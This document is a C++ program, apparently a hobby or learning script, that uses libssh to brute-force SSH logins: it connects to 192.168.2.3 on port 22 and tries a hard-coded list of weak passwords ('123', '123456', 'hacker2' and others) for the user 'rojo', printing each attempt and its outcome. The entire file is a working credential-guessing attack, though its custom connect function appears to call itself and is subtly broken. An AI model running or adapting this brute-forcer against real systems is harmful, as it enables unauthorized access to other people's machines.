#include <iostream>

#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <fcntl.h>
#include <errno.h>

#include <libssh/libssh.h>


int wait(const int sock) {
    int so_error, dir, count_fds;
    socklen_t opt_len = sizeof(so_error);
    
    fd_set rset, wset;
    struct timeval tv;

    FD_ZERO(&rset);
    FD_SET(sock, &rset);
    tv.tv_sec  = 10;
    tv.tv_usec = 0;
    
    count_fds = select(sock + 1, &rset, NULL, NULL, &tv);
    if(count_fds > 0)
        return 0;
    
    getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &opt_len);
    
    if(!(so_error || count_fds))
        return -1;
    
    return -2;
}


int connect(const uint16_t dst_port, const char *dst_addr) {
    int sock = -1;
    struct sockaddr_in sin;
 
    sock = socket(AF_INET, SOCK_STREAM, 0);
 
    //fcntl(sock, F_SETFL, O_NONBLOCK);
 
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dst_port);
    sin.sin_addr.s_addr = inet_addr(dst_addr);
    
    connect(sock, reinterpret_cast<struct sockaddr*>(&sin), sizeof(struct sockaddr_in));
    
    return sock;
}


int main() {

    int sock  = -1;
    int error =  0;
    int port  = 22;

    sock = connect(port, "192.168.2.3");

    std::cout << "sock: " << sock << std::endl;

    ssh_session session = ssh_new();

    ssh_options_set(session, SSH_OPTIONS_FD, &sock);

    error = ssh_connect(session);
    
    ssh_set_blocking(session, 0); //nonblocking

    const char *pass[] = {"123",
                          "1234",
                          "12345",
                          "123456",
                          "hacker2",
                          "111111"};

    if(error == SSH_OK) {
        std::cout << "Nos conectamos" << std::endl;
        
        int werror;
        for(int i=0; i < 6; i++) {
            while((error = ssh_userauth_password(session, "rojo", pass[i])) == SSH_AUTH_AGAIN) {
                werror = wait(sock);
                if(werror == 0) {
                    std::cout << "Connection OK" << std::endl;
                    continue;
                }

                if(werror == -1)
                    std::cout << "Timeout Error" << std::endl;
                else
                    std::cout << "Socket Error" << std::endl;

                break;
            }

            std::cout << error << std::endl;
            std::cout << "pass: " << pass[i] << std::endl;
            if(error == 0)
                break;

            if(werror < 0)
                break;
            std::cout << "#############################" << std::endl;
        }

        ssh_disconnect(session);
    }
    
    ssh_free(session);
}
